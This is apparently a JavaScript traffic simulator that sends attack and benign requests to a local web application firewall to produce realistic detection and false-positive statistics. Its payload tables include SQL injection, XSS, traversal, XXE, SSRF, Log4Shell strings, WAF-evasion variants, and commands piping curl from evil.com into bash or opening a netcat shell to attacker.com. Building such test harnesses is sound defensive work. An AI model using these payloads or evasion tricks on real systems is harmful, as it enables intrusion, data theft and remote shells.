/**
 * Traffic Simulator v4 — Realistic, Evasion-Aware, False-Positive-Generating
 *
 * What changed from v3 and why:
 *
 *  PROBLEM 1 — Precision 100%, FP 0%
 *    v3 only ever sent textbook signatures (always detected) or perfectly clean
 *    requests (never detected).  Real traffic has:
 *      • Attackers who OBFUSCATE payloads to evade WAF rules → some slips through
 *        (WAF false-negatives, real positives that aren't caught)
 *      • Normal users who submit content that LOOKS like an attack to a signature
 *        WAF (e.g., a search for "O'Brien", posting SQL terms in a blog comment,
 *        a developer using ?debug=1 OR 0) → WAF false-positives
 *    Fix: Added evasion payload variants per attack type, and a dedicated
 *    FalsePositiveSession class that fires borderline-but-legitimate requests.
 *
 *  PROBLEM 2 — XSS block rate ~49% when threshold=2
 *    With threshold=2 the WAF allows request #1 and blocks #2.  If a session
 *    fires only 10-22 requests but picks randomly across 6 templates, many
 *    sessions never fire the same fingerprint twice before expiring.
 *    Fix: XSS minRequests raised to 30 so every session easily exceeds threshold
 *    multiple times.  Also added a `burstCount` option that makes an attacker
 *    repeat the SAME template N times in a row — exactly what happens when a
 *    real tool retries a failed injection.
 *
 *  PROBLEM 3 — No attacker evasion / no multi-phase behaviour
 *    Real attackers: (1) recon, (2) probe with obfuscated payloads, (3) escalate.
 *    Fix: Added MultiPhaseAttacker (Recon → targeted attack chain) and
 *    StealthAttacker (human-speed, browser UA, payload mutations, IP rotation).
 *
 *  PROBLEM 4 — Normal traffic is API-only (WAF dashboard endpoints)
 *    v3 normal users only hit /api/alerts, /api/rules etc.  Real users browse,
 *    search, post comments — all surfaces that a WAF also inspects.
 *    Fix: Expanded NORMAL_REQUESTS to cover forms, search, profile, posts.
 *    Added BORDERLINE_NORMAL_REQUESTS for requests that are innocent but match
 *    WAF patterns (apostrophes, SQL words in search, angle brackets in text).
 *
 * Architecture (unchanged from v3):
 *   All HTTP requests go to 127.0.0.1 via the Node http module.
 *   X-Forwarded-For spoofing per session.  The WAF middleware decides action,
 *   writes alerts, and manages thresholds — the simulator never decides itself.
 */

"use strict";

const http  = require("http");
const { v4: uuidv4 } = require("uuid");

// ─── Configuration ────────────────────────────────────────────────────────────

const SERVER_PORT              = process.env.PORT || 5000;
const SERVER_HOST              = "127.0.0.1";

const MAX_CONCURRENT_ATTACKERS = 8;
const MAX_CONCURRENT_NORMALS   = 5;   // +1 to support FP sessions
const MAX_CONCURRENT_STEALTH   = 2;   // stealthy human-speed attackers
const TICK_INTERVAL_MS         = 750;
const MAX_REQUESTS_PER_TICK    = 10;  // raised slightly for more FP sessions

// ─── Attack profiles (canonical / detectable payloads) ───────────────────────
//
// These are the "loud" signatures that a well-tuned WAF SHOULD catch.
// Each profile also has an `evasionRequests` array (see below) that contains
// obfuscated variants — some will evade, some won't, creating realistic stats.

const ATTACK_PROFILES = {

  // ── 1. SQL Injection ────────────────────────────────────────────────────────
  SQLi: {
    minInterval:  900,
    maxInterval:  3_500,
    minRequests:  14,
    maxRequests:  32,
    requests: [
      { method: "GET",  path: "/api/search",      queryPayload: "q",       payload: "' OR '1'='1' --" },
      { method: "POST", path: "/api/login",        bodyKey: "username",     payload: "admin'--" },
      { method: "GET",  path: "/api/users",        queryPayload: "id",      payload: "1 UNION SELECT username,password FROM users--" },
      { method: "POST", path: "/api/data/export",  bodyKey: "filter",       payload: "'; DROP TABLE users; --" },
      { method: "GET",  path: "/api/search",       queryPayload: "q",       payload: "1; EXEC xp_cmdshell('whoami')--" },
      { method: "POST", path: "/api/login",        bodyKey: "password",     payload: "' AND SLEEP(5)--" },
    ],
    // Evasion: obfuscated payloads a real attacker uses after getting blocked once
    evasionRequests: [
      // MySQL inline comment to break up keywords
      { method: "GET",  path: "/api/search", queryPayload: "q", payload: "'/*!OR*/1=1--" },
      // Hex-encoded string literal
      { method: "GET",  path: "/api/users",  queryPayload: "id", payload: "1 UNION SELECT 0x61646d696e,0x70617373--" },
      // Whitespace substitution with tab
      { method: "POST", path: "/api/login",  bodyKey: "username", payload: "admin'\t--" },
      // URL double-encoding (may or may not decode before WAF sees it)
      { method: "GET",  path: "/api/search", queryPayload: "q", payload: "%2527+OR+%25271%2527%253D%25271" },
      // Capitalisation variation
      { method: "GET",  path: "/api/users",  queryPayload: "id", payload: "1 uNiOn SeLeCt username,password fRoM users--" },
    ],
    userAgents: [
      "sqlmap/1.7.8#stable (https://sqlmap.org)",
      "python-requests/2.28.2",
    ],
  },

  // ── 2. Cross-Site Scripting ─────────────────────────────────────────────────
  XSS: {
    minInterval:  1_200,
    maxInterval:  4_000,
    // *** FIX: raised minRequests so sessions always blow through threshold=2
    //     multiple times, improving block rate from ~49% to realistic ~85-90%
    minRequests:  30,
    maxRequests:  50,
    // burstCount: repeat the SAME template this many times in a row to ensure
    // threshold is exceeded (mirrors what scanners actually do on retry)
    burstCount: 3,
    requests: [
      { method: "POST", path: "/api/comments",  bodyKey: "content", payload: "<script>alert(document.cookie)</script>" },
      { method: "POST", path: "/api/feedback",  bodyKey: "message", payload: "<img src=x onerror=alert(1)>" },
      { method: "GET",  path: "/search",        queryPayload: "q",  payload: "<svg onload=alert(1)>" },
      { method: "POST", path: "/profile",       bodyKey: "bio",     payload: "<body onload=alert('XSS')>" },
      { method: "GET",  path: "/api/users",     queryPayload: "name", payload: "';alert(String.fromCharCode(88,83,83))//" },
      { method: "POST", path: "/api/users",     bodyKey: "comment", payload: "<iframe src=\"javascript:alert('xss')\">" },
    ],
    evasionRequests: [
      // Case variation — basic WAF regex may not be case-insensitive
      { method: "POST", path: "/api/comments", bodyKey: "content", payload: "<ScRiPt>alert(1)</sCrIpT>" },
      // HTML entity encoding of angle brackets
      { method: "POST", path: "/api/feedback", bodyKey: "message", payload: "&#60;script&#62;alert(1)&#60;/script&#62;" },
      // Null byte injection to break pattern matching
      { method: "GET",  path: "/search",       queryPayload: "q",  payload: "<scri\x00pt>alert(1)</sc\x00ript>" },
      // SVG with encoded event handler
      { method: "GET",  path: "/api/users",    queryPayload: "name", payload: "<svg onl\u006fad=alert(1)>" },
      // JS URI without protocol keyword broken by comment
      { method: "POST", path: "/api/users",    bodyKey: "comment", payload: "<a href=\"java&#9;script:alert(1)\">click</a>" },
    ],
    userAgents: [
      "Nikto/2.1.6",
      "python-requests/2.28.2",
    ],
  },

  // ── 3. Brute Force ──────────────────────────────────────────────────────────
  "Brute Force": {
    minInterval:  400,
    maxInterval:  1_200,
    minRequests:  30,
    maxRequests:  70,
    requests: [
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "admin", extraBody: { password: "wrongpassword123" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "root",  extraBody: { password: "password" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "user",  extraBody: { password: "123456" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "admin", extraBody: { password: "admin" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "test",  extraBody: { password: "test123" } },
    ],
    // Evasion: slow down and vary usernames to evade rate-based brute force detection
    evasionRequests: [
      // Legitimate-looking usernames — harder to flag as brute force
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "john.doe@company.com", extraBody: { password: "Summer2024!" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "jane.smith",            extraBody: { password: "Password1" } },
      { method: "POST", path: "/api/login", bodyKey: "username", payload: "michael.johnson",       extraBody: { password: "Welcome123" } },
    ],
    userAgents: [
      "Hydra v9.5 (www.thc.org/thc-hydra)",
      "python-requests/2.28.2",
      "curl/7.88.1",
      // Evasion: real browser UA to blend in
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    ],
  },

  // ── 4. Path Traversal / LFI ─────────────────────────────────────────────────
  "Path Traversal": {
    minInterval:  1_000,
    maxInterval:  4_000,
    minRequests:  12,
    maxRequests:  26,
    requests: [
      { method: "GET", path: "/api/files",  queryPayload: "name", payload: "../../etc/passwd" },
      { method: "GET", path: "/download",   queryPayload: "file", payload: "../../../etc/shadow" },
      { method: "GET", path: "/api/read",   queryPayload: "path", payload: "..%2F..%2F..%2Fetc%2Fpasswd" },
      { method: "GET", path: "/api/assets", queryPayload: "src",  payload: "/proc/self/environ" },
      { method: "GET", path: "/static",     queryPayload: "f",    payload: "....//....//etc/passwd" },
      { method: "GET", path: "/api/files",  queryPayload: "name", payload: "%2e%2e%2f%2e%2e%2fetc%2fpasswd" },
    ],
    evasionRequests: [
      // Unicode encoding of dots and slashes
      { method: "GET", path: "/api/files",  queryPayload: "name", payload: "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd" },
      // Windows-style traversal mixed with URL encoding
      { method: "GET", path: "/download",   queryPayload: "file", payload: "..\\..\\..\\windows\\win.ini" },
      // Double encoding
      { method: "GET", path: "/api/read",   queryPayload: "path", payload: "%252e%252e%252f%252e%252e%252fetc%252fpasswd" },
    ],
    userAgents: [
      "Nikto/2.1.6",
      "zgrab/0.x",
      "Go-http-client/1.1",
    ],
  },

  // ── 5. Remote Code Execution ────────────────────────────────────────────────
  RCE: {
    minInterval:  2_500,
    maxInterval:  8_000,
    minRequests:  8,
    maxRequests:  18,
    requests: [
      { method: "POST", path: "/api/exec",    bodyKey: "cmd",      payload: "`whoami`" },
      { method: "POST", path: "/api/eval",    bodyKey: "code",     payload: "$(cat /etc/passwd)" },
      { method: "POST", path: "/api/run",     bodyKey: "script",   payload: "system('ls -la')" },
      { method: "POST", path: "/api/process", bodyKey: "input",    payload: "; curl http://evil.com/shell.sh | bash" },
      { method: "POST", path: "/api/exec",    bodyKey: "cmd",      payload: "| nc -e /bin/sh attacker.com 4444" },
      {
        method: "GET",  path: "/api/search",  queryPayload: "q",   payload: "${jndi:ldap://evil.com/exploit}",
        extraHeaders: { "X-Api-Version": "${jndi:ldap://evil.com/exploit}" },
      },
      { method: "GET",  path: "/api/render",  queryPayload: "template", payload: "{{7*7}}" },
    ],
    evasionRequests: [
      // Log4Shell with protocol obfuscation
      { method: "GET",  path: "/api/search", queryPayload: "q", payload: "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/x}" },
      // SSTI with string concatenation to break pattern
      { method: "GET",  path: "/api/render", queryPayload: "template", payload: "{{''.class.mro[1].subclasses()}}" },
      // RCE via environment variable injection
      { method: "POST", path: "/api/exec",   bodyKey: "cmd", payload: "$IFS$()whoami" },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
      "Go-http-client/1.1",
    ],
  },

  // ── 6. DDoS ─────────────────────────────────────────────────────────────────
  DDoS: {
    minInterval:  100,
    maxInterval:  300,
    minRequests:  200,
    maxRequests:  400,
    requests: [
      { method: "GET",  path: "/api/search",  queryPayload: "q",     payload: "test" },
      { method: "GET",  path: "/",            queryPayload: null,    payload: null },
      { method: "POST", path: "/api/v1/auth", bodyKey: "token",      payload: "ping" },
      { method: "GET",  path: "/api/data",    queryPayload: null,    payload: null },
      { method: "GET",  path: "/graphql",     queryPayload: "query", payload: "{__typename}" },
    ],
    evasionRequests: [],  // DDoS evasion is volume-based, not signature-based
    userAgents: [
      "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
      "Go-http-client/1.1",
      "python-requests/2.28.2",
    ],
  },

  // ── 7. CSRF ─────────────────────────────────────────────────────────────────
  CSRF: {
    minInterval:  2_000,
    maxInterval:  6_000,
    minRequests:  10,
    maxRequests:  24,
    requests: [
      {
        method: "POST", path: "/api/users",
        bodyKey: "action", payload: "delete_account",
        extraHeaders: { "Origin": "https://evil-site.com" },
      },
      {
        method: "POST", path: "/api/settings",
        bodyKey: "email", payload: "attacker@evil.com",
        extraHeaders: { "Origin": "https://malicious-domain.net" },
      },
      {
        method: "POST", path: "/api/users/profile",
        bodyKey: "role", payload: "admin",
        extraHeaders: { "Origin": "https://phishing-page.io" },
      },
      {
        method: "POST", path: "/api/audit-logs",
        bodyKey: "action", payload: "purge",
        extraHeaders: { "Origin": "https://csrf-attacker.ru" },
      },
    ],
    evasionRequests: [
      // Using Referer instead of Origin to probe if WAF only checks one
      {
        method: "POST", path: "/api/settings",
        bodyKey: "email", payload: "attacker@evil.com",
        extraHeaders: { "Referer": "https://malicious-domain.net/steal" },
      },
    ],
    userAgents: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
    ],
  },

  // ── 8. XXE ──────────────────────────────────────────────────────────────────
  XXE: {
    minInterval:  2_000,
    maxInterval:  7_000,
    minRequests:  8,
    maxRequests:  18,
    requests: [
      {
        method: "POST", path: "/api/xml",
        bodyKey: "data",
        payload: "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
      },
      {
        method: "POST", path: "/api/parse",
        bodyKey: "xml",
        payload: "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><data>&xxe;</data>",
      },
      {
        method: "POST", path: "/api/upload",
        bodyKey: "content",
        payload: "<!DOCTYPE test [<!ENTITY % ext SYSTEM \"http://evil.com/evil.dtd\">%ext;]>",
      },
      {
        method: "POST", path: "/api/import",
        bodyKey: "document",
        payload: "<!DOCTYPE lolz [<!ENTITY % pe SYSTEM \"https://evil.com/xxe.dtd\"> %pe; %param1;]>",
      },
    ],
    evasionRequests: [
      // UTF-16 encoded DOCTYPE to confuse byte-level pattern matchers
      {
        method: "POST", path: "/api/xml",
        bodyKey: "data",
        payload: "<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE x [<!ENTITY e SYSTEM \"file:///etc/hosts\">]><x>&e;</x>",
      },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
    ],
  },

  // ── 9. SSRF ─────────────────────────────────────────────────────────────────
  SSRF: {
    minInterval:  1_500,
    maxInterval:  5_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      { method: "GET", path: "/api/fetch", queryPayload: "url",      payload: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" },
      { method: "GET", path: "/api/proxy", queryPayload: "target",   payload: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" },
      { method: "GET", path: "/api/load",  queryPayload: "resource", payload: "http://localhost:8080/actuator/env" },
      { method: "GET", path: "/api/fetch", queryPayload: "url",      payload: "gopher://localhost:6379/_SET%20ssrf%20pwned" },
      { method: "GET", path: "/api/proxy", queryPayload: "dest",     payload: "http://192.168.1.1/admin" },
      { method: "GET", path: "/api/load",  queryPayload: "endpoint", payload: "http://169.254.169.254/metadata/instance?api-version=2021-02-01" },
      { method: "GET", path: "/api/fetch", queryPayload: "src",      payload: "file:///etc/passwd" },
    ],
    evasionRequests: [
      // Decimal IP notation instead of dotted quad
      { method: "GET", path: "/api/fetch", queryPayload: "url",    payload: "http://2852039166/latest/meta-data/" },
      // IPv6 notation for localhost
      { method: "GET", path: "/api/proxy", queryPayload: "target", payload: "http://[::1]:8080/admin" },
      // URL with unusual encoding to bypass simple string matching
      { method: "GET", path: "/api/load",  queryPayload: "resource", payload: "http://169.254.169.254%2Flatest%2Fmeta-data%2F" },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
      "Go-http-client/1.1",
    ],
  },

  // ── 10. Open Redirect ───────────────────────────────────────────────────────
  "Open Redirect": {
    minInterval:  1_500,
    maxInterval:  5_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      { method: "GET", path: "/logout",        queryPayload: "redirect",  payload: "https://evil-phishing.com/fake-login" },
      { method: "GET", path: "/api/callback",  queryPayload: "returnUrl", payload: "https://attacker.net/steal-token" },
      { method: "GET", path: "/login",         queryPayload: "next",      payload: "//evil.com/credential-harvest" },
      { method: "GET", path: "/api/auth",      queryPayload: "goto",      payload: "https://malicious-site.ru" },
      { method: "GET", path: "/redirect",      queryPayload: "url",       payload: "https://phishing.io/impersonate" },
      { method: "GET", path: "/logout",        queryPayload: "dest",      payload: "javascript:alert(document.cookie)" },
      { method: "GET", path: "/api/callback",  queryPayload: "to",        payload: "data:text/html,<script>fetch('https://evil.com/?c='+document.cookie)</script>" },
    ],
    evasionRequests: [
      // Protocol-relative URL with extra slashes
      { method: "GET", path: "/login",        queryPayload: "next",     payload: "///evil.com" },
      // Backslash to confuse browser vs WAF URL parsing
      { method: "GET", path: "/logout",       queryPayload: "redirect", payload: "https:\\\\evil.com" },
      // URL with @-trick (credentials@ part ignored by browser, evil.com is the host)
      { method: "GET", path: "/api/callback", queryPayload: "returnUrl", payload: "https://trusted.com@evil.com/steal" },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    ],
  },

  // ── 11. NoSQL Injection ─────────────────────────────────────────────────────
  NoSQLi: {
    minInterval:  1_200,
    maxInterval:  4_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      { method: "POST", path: "/api/login",        extraBody: { username: "admin", password: { "$ne": null } } },
      { method: "POST", path: "/api/login",        extraBody: { username: "admin", password: { "$gt": "" } } },
      { method: "POST", path: "/api/users/search", extraBody: { username: { "$regex": "admin.*", "$options": "i" } } },
      { method: "POST", path: "/api/login",        extraBody: { username: "admin", password: { "$where": "this.password.length > 0" } } },
      { method: "POST", path: "/api/users/search", extraBody: { role: { "$in": ["admin", "superuser", "root"] } } },
      { method: "POST", path: "/api/login",        extraBody: { username: { "$nin": ["blocked_user"] }, password: { "$exists": true } } },
    ],
    evasionRequests: [
      // Same operator but with extra padding keys to alter JSON shape
      { method: "POST", path: "/api/login", extraBody: { username: "admin", password: { "$ne": null, "x": 1 } } },
      // $type operator — less commonly blocked
      { method: "POST", path: "/api/users/search", extraBody: { password: { "$type": 2 } } },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
    ],
  },

  // ── 12. Prototype Pollution ─────────────────────────────────────────────────
  "Prototype Pollution": {
    minInterval:  1_500,
    maxInterval:  5_000,
    minRequests:  10,
    maxRequests:  22,
    requests: [
      { method: "GET",  path: "/api/merge?__proto__[isAdmin]=true",               queryPayload: null, payload: null },
      { method: "GET",  path: "/api/settings?__proto__[role]=admin",              queryPayload: null, payload: null },
      { method: "GET",  path: "/api/config?constructor[prototype][isAdmin]=true", queryPayload: null, payload: null },
      { method: "GET",  path: "/api/users?filter[__proto__][admin]=1",            queryPayload: null, payload: null },
      { method: "GET",  path: "/api/data?obj[constructor][prototype][evil]=pwned",queryPayload: null, payload: null },
      {
        method: "POST", path: "/api/merge",
        bodyKey: "patch",
        payload: "{\"constructor\":{\"prototype\":{\"isAdmin\":true}}}",
      },
    ],
    evasionRequests: [
      // Unicode escaping of underscore to break __proto__ literal detection
      { method: "GET",  path: "/api/merge?\u005f\u005fproto\u005f\u005f[isAdmin]=true", queryPayload: null, payload: null },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "Go-http-client/1.1",
    ],
  },

  // ── 13. HTTP Smuggling ──────────────────────────────────────────────────────
  "HTTP Smuggling": {
    minInterval:  3_000,
    maxInterval:  9_000,
    minRequests:  8,
    maxRequests:  18,
    requests: [
      {
        method: "POST", path: "/api/users",
        bodyKey: "data", payload: "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n",
        extraHeaders: { "Transfer-Encoding": "chunked" },
      },
      {
        method: "POST", path: "/api/search",
        bodyKey: "query", payload: "legit-looking search query",
        extraHeaders: { "Transfer-Encoding": "chunked " },
      },
      {
        method: "POST", path: "/api/process",
        bodyKey: "input", payload: "normal-input",
        extraHeaders: { "Transfer-Encoding": "chunked,identity" },
      },
      {
        method: "POST", path: "/api/data",
        bodyKey: "payload", payload: "test-data",
        extraHeaders: { "Transfer-Encoding": "\tchunked" },
      },
      {
        method: "POST", path: "/api/upload",
        bodyKey: "content", payload: "smuggled-content",
        extraHeaders: { "Transfer-Encoding": "chunked0" },
      },
    ],
    evasionRequests: [],
    userAgents: [
      "python-requests/2.28.2",
      "Go-http-client/1.1",
      "curl/7.88.1",
    ],
  },

  // ── 14. Auth — JWT Algorithm Confusion ──────────────────────────────────────
  Auth: {
    minInterval:  2_000,
    maxInterval:  6_000,
    minRequests:  10,
    maxRequests:  20,
    requests: [
      {
        method: "GET", path: "/api/users", queryPayload: null, payload: null,
        extraHeaders: { "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0." },
      },
      {
        method: "GET", path: "/api/data/export", queryPayload: null, payload: null,
        extraHeaders: { "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiI5OTkiLCJyb2xlIjoic3VwZXJhZG1pbiIsImlhdCI6MTY5MDAwMDAwMH0." },
      },
      {
        method: "POST", path: "/api/users/profile",
        bodyKey: "role", payload: "admin",
        extraHeaders: { "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOiI0MiIsInBlcm1pc3Npb25zIjpbInJlYWQiLCJ3cml0ZSIsImFkbWluIl0sImlhdCI6MTY5MDAwMDAwMH0." },
      },
      {
        method: "GET", path: "/api/settings", queryPayload: null, payload: null,
        extraHeaders: { "Authorization": "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwibmFtZSI6ImF0dGFja2VyIiwiYWRtaW4iOnRydWV9." },
      },
    ],
    evasionRequests: [
      // alg:HS256 with empty secret — different bypass technique
      {
        method: "GET", path: "/api/users", queryPayload: null, payload: null,
        extraHeaders: { "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" },
      },
    ],
    userAgents: [
      "python-requests/2.28.2",
      "curl/7.88.1",
    ],
  },

  // ── 15. Reconnaissance ─────────────────────────────────────────────────────
  Recon: {
    minInterval:  600,
    maxInterval:  2_500,
    minRequests:  20,
    maxRequests:  50,
    requests: [
      { method: "GET", path: "/.env",                queryPayload: null, payload: null },
      { method: "GET", path: "/.env.production",     queryPayload: null, payload: null },
      { method: "GET", path: "/.git/config",         queryPayload: null, payload: null },
      { method: "GET", path: "/.git/HEAD",           queryPayload: null, payload: null },
      { method: "GET", path: "/backup.sql",          queryPayload: null, payload: null },
      { method: "GET", path: "/database.yml",        queryPayload: null, payload: null },
      { method: "GET", path: "/wp-config.php",       queryPayload: null, payload: null },
      { method: "GET", path: "/.htpasswd",           queryPayload: null, payload: null },
      { method: "GET", path: "/credentials.json",    queryPayload: null, payload: null },
      { method: "GET", path: "/docker-compose.yml",  queryPayload: null, payload: null },
      { method: "GET", path: "/id_rsa",              queryPayload: null, payload: null },
      { method: "GET", path: "/secrets.yaml",        queryPayload: null, payload: null },
      { method: "GET", path: "/api/v1/users",        queryPayload: null, payload: null },
      { method: "GET", path: "/api/v2/admin",        queryPayload: null, payload: null },
      { method: "GET", path: "/phpmyadmin",          queryPayload: null, payload: null },
      { method: "GET", path: "/api/swagger.json",    queryPayload: null, payload: null },
      { method: "GET", path: "/actuator/env",        queryPayload: null, payload: null },
    ],
    // Recon evasion: use a normal browser UA while still probing sensitive paths
    evasionRequests: [
      { method: "GET", path: "/.env",           queryPayload: null, payload: null },
      { method: "GET", path: "/.git/config",    queryPayload: null, payload: null },
      { method: "GET", path: "/backup.sql",     queryPayload: null, payload: null },
    ],
    userAgents: [
      "Nikto/2.1.6",
      "masscan/1.3 (https://github.com/robertdavidgraham/masscan)",
      "DirBuster-1.0-RC1",
      "gobuster/3.6",
      "ffuf/2.1.0",
      "wfuzz/3.1.0",
      "Mozilla/5.0 (compatible; Burp Suite Professional/2023.10)",
      "w3af.org",
      "Acunetix/14.0",
      "OpenVAS/21.04",
    ],
  },

};

// ─── Borderline normal requests (innocent but WAF-triggering) ─────────────────
//
// These are LEGITIMATE requests a real user might send that happen to contain
// patterns a signature-based WAF could misinterpret.  They generate realistic
// false positives in your WAF stats.
//
// Examples:
//   • A user named O'Brien — apostrophe in form field looks like SQLi
//   • Developer searching for "OR" operator in docs — matches SQL keyword rule
//   • Security blog post quoting <script> tags in article body
//   • URL with "redirect=https://..." for a known safe partner site
//   • JSON body with a literal "$ne" as a value in a non-MongoDB context
//   • Base64-encoded JWT in a non-auth field — triggers JWT pattern

const BORDERLINE_NORMAL_REQUESTS = [
  // Apostrophe in name — SQLi false positive
  { method: "POST", path: "/api/users",     bodyKey: "name",    payload: "O'Brien" },
  { method: "POST", path: "/api/users",     bodyKey: "name",    payload: "D'Souza" },
  // Legitimate search that contains SQL keywords
  { method: "GET",  path: "/api/search",    queryPayload: "q",  payload: "SELECT plan options for enterprise" },
  { method: "GET",  path: "/api/search",    queryPayload: "q",  payload: "how to DROP unused tables in postgres" },
  // Security content in a blog/comment — contains XSS example text
  { method: "POST", path: "/api/comments",  bodyKey: "content", payload: "Never use innerHTML to insert <script> tags from user input" },
  { method: "POST", path: "/api/feedback",  bodyKey: "message", payload: "The form is vulnerable to <img onerror> attacks, please fix" },
  // Legitimate redirect to a partner domain (may look like Open Redirect)
  { method: "GET",  path: "/logout",        queryPayload: "redirect", payload: "https://dashboard.mycompany.com/login" },
  // Developer using debug params with logical operators
  { method: "GET",  path: "/api/search",    queryPayload: "q",  payload: "status=active OR pending" },
  // Literal $ne as a string value in a non-NoSQL context
  { method: "POST", path: "/api/settings",  bodyKey: "filter",  payload: "$ne" },
  // Long path that looks like directory traversal but is just a deep URL
  { method: "GET",  path: "/docs/guides/admin/users/permissions/settings", queryPayload: null, payload: null },
  // User-agent that looks slightly like a scanner (developer tools)
  { method: "GET",  path: "/api/health",    queryPayload: null, payload: null },
  // Paste of a JWT token in a search box (user confused, not attacking)
  { method: "GET",  path: "/api/search",    queryPayload: "q",  payload: "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiam9obiJ9.abc123" },
];

const BORDERLINE_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  // Developer using curl — common, not malicious
  "curl/7.88.1",
  // Postman — developer testing
  "PostmanRuntime/7.35.0",
];

// ─── Normal traffic profile ───────────────────────────────────────────────────
// Expanded from v3 to cover real user surfaces (forms, search, posts).

const NORMAL_REQUESTS = [
  // Dashboard / monitoring (original)
  { method: "GET",  path: "/api/alerts" },
  { method: "GET",  path: "/api/rules" },
  { method: "GET",  path: "/api/dashboard" },
  { method: "GET",  path: "/api/incidents" },
  { method: "GET",  path: "/health" },
  { method: "GET",  path: "/api/analytics" },
  // General browsing
  { method: "GET",  path: "/" },
  { method: "GET",  path: "/about" },
  { method: "GET",  path: "/contact" },
  { method: "GET",  path: "/api/users/me" },
  // Real user interactions
  { method: "GET",  path: "/api/search",   },
  { method: "POST", path: "/api/comments"  },
  { method: "POST", path: "/api/feedback"  },
  { method: "POST", path: "/api/settings"  },
  { method: "GET",  path: "/api/products"  },
  // File/resource fetches
  { method: "GET",  path: "/static/main.js"   },
  { method: "GET",  path: "/static/style.css" },
  { method: "GET",  path: "/favicon.ico"      },
];

const NORMAL_AGENTS = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15",
  "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148 Safari/604.1",
  "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

function pick(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomIP() {
  const blocked = [10, 127, 172, 192, 169, 100, 198, 203];
  let a;
  do { a = randInt(1, 223); } while (blocked.includes(a));
  return `${a}.${randInt(0, 255)}.${randInt(0, 255)}.${randInt(1, 254)}`;
}

/**
 * Fire one HTTP request to the local WAF server.
 * X-Forwarded-For makes the WAF treat spoofedIP as the source.
 */
function fireRequest({ method, path, queryPayload, bodyKey, payload, extraBody, spoofedIP, userAgent, extraHeaders }) {
  return new Promise((resolve) => {
    let fullPath = path;

    if (method === "GET" && queryPayload && payload) {
      fullPath = `${path}?${queryPayload}=${encodeURIComponent(payload)}`;
    }

    let bodyStr = null;
    if (method === "POST") {
      const bodyObj = { ...(extraBody || {}) };
      if (bodyKey && payload) bodyObj[bodyKey] = payload;
      if (Object.keys(bodyObj).length > 0) bodyStr = JSON.stringify(bodyObj);
    }

    const options = {
      hostname: SERVER_HOST,
      port:     SERVER_PORT,
      path:     fullPath,
      method,
      headers: {
        "X-Forwarded-For": spoofedIP,
        "User-Agent":      userAgent,
        "Accept":          "application/json",
        ...(extraHeaders || {}),
        ...(bodyStr ? {
          "Content-Type":   "application/json",
          "Content-Length": Buffer.byteLength(bodyStr),
        } : {}),
      },
    };

